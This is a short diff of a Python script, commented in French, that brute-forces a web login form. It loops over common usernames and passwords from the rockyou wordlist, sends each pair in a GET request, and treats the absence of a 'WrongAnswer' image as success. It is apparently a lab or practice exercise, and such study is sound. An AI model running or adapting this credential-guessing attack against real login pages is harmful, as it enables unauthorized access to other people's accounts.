@@ -6,7 +6,7 @@ users = ["admin", "root", "user", "test"]
 
 # Chargement des mots de passe rockyou
 passwords = []
-with open("/home/anaouali/Downloads/rockyou.txt", "r", encoding="latin-1") as f:
+with open("rockyou.txt", "r", encoding="latin-1") as f:
     for line in f:
         passwords.append(line.strip())
 
@@ -22,7 +22,6 @@ for user in users:
 
         r = requests.get(base_url, params=params)
 
-        # Le site affiche WrongAnswer.gif quand c'est faux
         if "WrongAnswer" not in r.text:
             print(f"[OK] Trouvé → {user} / {pwd}")
             exit()
